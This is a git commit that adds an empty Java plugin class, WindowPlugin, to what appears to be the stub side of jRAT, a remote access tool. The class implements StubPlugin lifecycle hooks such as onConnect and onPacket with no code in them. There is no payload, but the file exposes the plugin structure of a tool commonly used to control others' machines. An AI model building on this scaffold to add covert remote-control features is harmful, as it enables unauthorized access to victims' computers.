31071f068ba89e926126305679112e5ca813e0b6
redpois0n <red@cmail.nu>
2015-05-16 10:37:19 +0200

    Stub plugin

---
+++ Plugin Window Controller Stub/src/se/jrat/plugin/window/stub/WindowPlugin.java
@@ -0,0 +1,35 @@
+package se.jrat.plugin.window.stub;
+
+import java.io.DataInputStream;
+import java.io.DataOutputStream;
+
+import jrat.api.stub.StubPlugin;
+
+public class WindowPlugin extends StubPlugin {
+
+	@Override
+	public void onStart() throws Exception {
+		
+	}
+
+	@Override
+	public void onDisconnect(Exception ex) throws Exception {
+		
+	}
+
+	@Override
+	public void onConnect(DataInputStream dis, DataOutputStream dos) throws Exception {
+		
+	}
+
+	@Override
+	public void onPacket(byte header) throws Exception {
+		
+	}
+
+	@Override
+	public void onEnable() throws Exception {
+		
+	}
+
+}
